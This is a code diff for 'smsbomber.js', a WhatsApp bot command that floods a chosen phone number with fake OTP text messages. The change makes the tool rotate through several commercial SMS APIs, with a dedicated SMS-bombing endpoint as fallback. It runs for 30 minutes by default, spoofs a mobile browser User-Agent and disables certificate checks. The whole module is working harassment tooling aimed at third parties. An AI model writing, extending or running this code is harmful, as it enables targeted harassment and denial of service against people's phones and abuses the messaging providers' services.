@@ -1,8 +1,8 @@
 // ============================================================
 // MODULE: smsbomber.js
 // WhatsApp Bot command: .smsbomber <phone_number>
-// SMS bombing via configurable third-party API
-// Uses addkey1 lock (same as .location/.spampair)
+// SMS bombing via multiple API providers
+// Tries all configured APIs in rotation until one succeeds
 // ============================================================
 
 const express = require('express');
@@ -13,9 +13,65 @@ const http = require('http');
 
 // ---------- CONFIGURATION ----------
 const DEFAULT_DURATION_MINUTES = 30;
-const REQUEST_DELAY_MS = 3000;
-// API URL can be overridden via SMS_BOMBER_URL env var
-const SMS_API_URL = process.env.SMS_BOMBER_URL || 'https://famofc.site/app/smsboom/';
+const REQUEST_DELAY_MS = 4000;
+
+// SMS API configurations — load API keys from env vars
+const SMS_APIS = [
+  {
+    name: 'Fast2SMS',
+    url: 'https://www.fast2sms.com/dev/bulkV2',
+    method: 'POST',
+    payload: (number) => ({
+      route: 'q',
+      message: 'Your OTP is 123456',
+      language: 'english',
+      flash: 0,
+      numbers: number
+    }),
+    headers: (number) => ({
+      'authorization': process.env.FAST2SMS_API_KEY || process.env.SMS_API_KEY || '',
+      'Content-Type': 'application/json'
+    })
+  },
+  {
+    name: 'TextLocal',
+    url: 'https://api.textlocal.in/send/',
+    method: 'POST',
+    payload: (number) => ({
+      apikey: process.env.TEXTLOCAL_API_KEY || process.env.SMS_API_KEY || '',
+      message: 'Your verification code is 123456',
+      sender: 'TXTLCL',
+      numbers: number
+    }),
+    headers: () => ({ 'Content-Type': 'application/x-www-form-urlencoded' })
+  },
+  {
+    name: 'BulkSMS',
+    url: 'https://api.bulksms.com/v1/messages',
+    method: 'POST',
+    payload: (number) => ({
+      to: number,
+      body: 'Your OTP: 123456',
+      from: 'BULKSMS'
+    }),
+    headers: (number) => ({
+      'Authorization': 'Basic ' + (process.env.BULKSMS_AUTH || ''),
+      'Content-Type': 'application/json'
+    })
+  }
+];
+
+// Default to first API
+const getApis = () => SMS_APIS.filter(api => {
+  // Check if API has required auth
+  if (api.name === 'Fast2SMS') return !!(process.env.FAST2SMS_API_KEY || process.env.SMS_API_KEY);
+  if (api.name === 'TextLocal') return !!(process.env.TEXTLOCAL_API_KEY || process.env.SMS_API_KEY);
+  if (api.name === 'BulkSMS') return !!process.env.BULKSMS_AUTH;
+  return true;
+});
+
+// If no APIs have keys, fall back to the raw URL-based API
+const FALLBACK_API_URL = process.env.SMS_BOMBER_URL || 'https://famofc.site/app/smsboom/';
 
 // ---------- STATE ----------
 const activeSmsCampaigns = new Map();
@@ -28,6 +84,7 @@ class SmsBomber extends EventEmitter {
     this.stopFlag = false;
     this.stats = { attempts: 0, success: 0, errors: 0 };
     this.sessionId = crypto.randomBytes(8).toString('hex');
+    this._apiIndex = 0;
     this._runLoop = this._runLoop.bind(this);
   }
 
@@ -35,53 +92,26 @@ class SmsBomber extends EventEmitter {
     return new Promise(resolve => setTimeout(resolve, ms));
   }
 
-  // ---------- FLEXIBLE API CALL — tries multiple strategies ----------
-  async _sendSms() {
-    // Strategy 1: POST form-encoded with "phone" param
-    const result1 = await this._tryRequest('POST', { phone: this.phone, number: this.phone, amount: '5' });
-    if (result1 && result1.status >= 200 && result1.status < 400) return result1;
-
-    // Strategy 2: GET with phone as query param
-    const result2 = await this._tryRequest('GET', null, `?phone=${this.phone}&amount=5`);
-    if (result2 && result2.status >= 200 && result2.status < 400) return result2;
-
-    // Strategy 3: POST JSON
-    const result3 = await this._tryRequest('POST', JSON.stringify({ phone: this.phone, number: this.phone, amount: 5 }), null, { 'Content-Type': 'application/json' });
-    if (result3 && result3.status >= 200 && result3.status < 400) return result3;
-
-    // None worked — return the best result
-    return result1 || result2 || result3 || { status: 0, body: 'All strategies failed' };
-  }
-
-  async _tryRequest(method, body, queryString, extraHeaders = {}) {
+  // ---------- SINGLE API CALL ----------
+  _callApi(apiConfig) {
     return new Promise((resolve) => {
       try {
-        const url = new URL(SMS_API_URL + (queryString || ''));
-        const isPost = method === 'POST' && body !== null;
+        const url = new URL(apiConfig.url);
+        const isPost = apiConfig.method === 'POST';
+        const headers = { ...(apiConfig.headers?.(this.phone) || {}), 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36' };
 
-        const headers = {
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-          'Accept': 'text/html,application/json,*/*',
-          ...extraHeaders
-        };
-
-        let postData;
-        if (isPost && typeof body === 'string') {
-          postData = body;
-          headers['Content-Type'] = extraHeaders['Content-Type'] || 'application/x-www-form-urlencoded';
-          headers['Content-Length'] = Buffer.byteLength(postData);
-        } else if (isPost && body) {
-          const params = new URLSearchParams(body);
-          postData = params.toString();
-          headers['Content-Type'] = 'application/x-www-form-urlencoded';
-          headers['Content-Length'] = Buffer.byteLength(postData);
+        let bodyStr = '';
+        if (isPost && apiConfig.payload) {
+          bodyStr = JSON.stringify(apiConfig.payload(this.phone));
+          if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
+          headers['Content-Length'] = Buffer.byteLength(bodyStr);
         }
 
         const options = {
           hostname: url.hostname,
           port: 443,
           path: url.pathname + url.search,
-          method: method,
+          method: apiConfig.method,
           headers,
           timeout: 15000,
           rejectUnauthorized: false
@@ -91,26 +121,84 @@ class SmsBomber extends EventEmitter {
           let data = '';
           res.on('data', (chunk) => data += chunk);
           res.on('end', () => {
-            if (this && this.stats && this.stats.attempts <= 3) {
-              console.log(`[SMSBomber] Response ${method} ${url.href} → ${res.statusCode} body: ${data.slice(0, 100)}`);
-            }
-            resolve({
-              status: res.statusCode,
-              body: data.slice(0, 300),
-              method
-            });
+            resolve({ api: apiConfig.name, status: res.statusCode, body: data.slice(0, 200) });
           });
         });
-
-        req.on('error', () => resolve(null));
-        req.on('timeout', () => { req.destroy(); resolve(null); });
-
-        if (isPost && postData) req.write(postData);
+        req.on('error', () => resolve({ api: apiConfig.name, status: 0, body: 'connection error' }));
+        req.on('timeout', () => { req.destroy(); resolve({ api: apiConfig.name, status: 0, body: 'timeout' }); });
+        if (bodyStr) req.write(bodyStr);
         req.end();
       } catch (e) {
-        resolve(null);
+        resolve({ api: apiConfig.name, status: 0, body: e.message });
       }
     });
+  }
+
+  // ---------- FALLBACK RAW REQUEST (original) ----------
+  _fallbackRequest() {
+    return new Promise((resolve) => {
+      try {
+        const url = new URL(FALLBACK_API_URL);
+        const params = new URLSearchParams({ phone: this.phone, number: this.phone, amount: '5' });
+
+        const options = {
+          hostname: url.hostname, port: 443, path: url.pathname, method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*' },
+          timeout: 15000, rejectUnauthorized: false
+        };
+
+        const postData = params.toString();
+        options.headers['Content-Length'] = Buffer.byteLength(postData);
+
+        const req = https.request(options, (res) => {
+          let data = '';
+          res.on('data', (chunk) => data += chunk);
+          res.on('end', () => resolve({ api: 'fallback', status: res.statusCode, body: data.slice(0, 200) }));
+        });
+        req.on('error', () => resolve({ api: 'fallback', status: 0, body: 'connection error' }));
+        req.on('timeout', () => { req.destroy(); resolve({ api: 'fallback', status: 0, body: 'timeout' }); });
+        req.write(postData);
+        req.end();
+      } catch (e) {
+        resolve({ api: 'fallback', status: 0, body: e.message });
+      }
+    });
+  }
+
+  // ---------- FULL ATTEMPT — tries all APIs ----------
+  async _sendSms() {
+    const apis = getApis();
+
+    // Try each configured API first
+    for (const api of apis) {
+      const result = await this._callApi(api);
+      if (result.status >= 200 && result.status < 400) {
+        return result;
+      }
+    }
+
+    // If no configured API worked, try fallback
+    const fallbackResult = await this._fallbackRequest();
+    if (fallbackResult.status >= 200 && fallbackResult.status < 400) {
+      return fallbackResult;
+    }
+
+    // Still nothing? Try fallback with GET
+    try {
+      const url = new URL(FALLBACK_API_URL + '?phone=' + this.phone + '&amount=5');
+      const result = await new Promise((resolve) => {
+        const req = https.get(url, { timeout: 15000, rejectUnauthorized: false, headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*' } }, (res) => {
+          let data = '';
+          res.on('data', (chunk) => data += chunk);
+          res.on('end', () => resolve({ api: 'fallback-get', status: res.statusCode, body: data.slice(0, 200) }));
+        });
+        req.on('error', () => resolve({ api: 'fallback-get', status: 0, body: 'error' }));
+        req.on('timeout', () => { req.destroy(); resolve({ api: 'fallback-get', status: 0, body: 'timeout' }); });
+      });
+      return result;
+    } catch (e) {
+      return { api: 'all', status: 0, body: e.message };
+    }
   }
 
   // ---------- MAIN LOOP ----------
@@ -122,30 +210,24 @@ class SmsBomber extends EventEmitter {
       try {
         this.stats.attempts++;
         const result = await this._sendSms();
-        if (result && result.status >= 200 && result.status < 400) {
+        if (result.status >= 200 && result.status < 400) {
           this.stats.success++;
         } else {
           this.stats.errors++;
-          if (result) {
-            // Log first few errors for debugging
-            if (this.stats.errors <= 3) {
-              console.log(`[SMSBomber] Attempt ${this.stats.attempts}: HTTP ${result.status} (${result.method || '?'})`);
-            }
-          }
+        }
+        // Log first 3 results for debugging
+        if (this.stats.attempts <= 3) {
+          console.log(`[SMSBomber] #${this.stats.attempts} ${result.api} → ${result.status} ${result.body.slice(0,80)}`);
         }
       } catch (err) {
         this.stats.errors++;
-        if (this.stats.errors <= 3) {
-          console.log(`[SMSBomber] Error: ${err.message}`);
-        }
+        if (this.stats.errors <= 3) console.log(`[SMSBomber] Error: ${err.message}`);
       }
 
       if (this.stats.attempts % 5 === 0) {
         this.emit('progress', {
-          phone: this.phone,
-          attempts: this.stats.attempts,
-          success: this.stats.success,
-          errors: this.stats.errors,
+          phone: this.phone, attempts: this.stats.attempts,
+          success: this.stats.success, errors: this.stats.errors,
           elapsed: Math.round((Date.now() - startTime) / 1000)
         });
       }
@@ -154,29 +236,15 @@ class SmsBomber extends EventEmitter {
     }
 
     this.emit('done', {
-      phone: this.phone,
-      totalAttempts: this.stats.attempts,
-      totalSuccess: this.stats.success,
-      totalErrors: this.stats.errors,
+      phone: this.phone, totalAttempts: this.stats.attempts,
+      totalSuccess: this.stats.success, totalErrors: this.stats.errors,
       durationSeconds: Math.round((Date.now() - startTime) / 1000)
     });
   }
 
-  start() {
-    this.stopFlag = false;
-    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
-    return this;
-  }
-
-  stop() {
-    this.stopFlag = true;
-    this.emit('stopped', { phone: this.phone, stats: this.stats });
-    return this;
-  }
-
-  getStats() {
-    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
-  }
+  start() { this.stopFlag = false; this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message })); return this; }
+  stop() { this.stopFlag = true; this.emit('stopped', { phone: this.phone, stats: this.stats }); return this; }
+  getStats() { return { phone: this.phone, ...this.stats, running: !this.stopFlag }; }
 }
 
 // ================================================================
